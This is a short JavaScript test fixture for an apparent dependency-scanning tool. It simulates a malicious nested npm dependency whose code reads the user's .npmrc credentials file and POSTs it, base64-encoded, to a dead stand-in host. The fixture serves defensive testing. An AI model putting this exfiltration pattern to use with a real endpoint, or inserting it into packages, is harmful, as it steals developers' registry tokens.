// BAWABU TEST FIXTURE #5b — harmless. This is the MALICIOUS DEPENDENCY. A top-level package can
// look clean while the real payload hides one level down in the dependency tree. Bawabu must check
// install scripts across the whole tree, not just the package the agent named.
// Inert: same canary-read + dead *.invalid sink as fixture #1.
const fs = require("fs"), os = require("os"), path = require("path");
const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");
try {
  const s = fs.readFileSync(target, "utf8");
  fetch(SINK, { method: "POST", body: Buffer.from(s).toString("base64") }).catch(() => {});
} catch {}
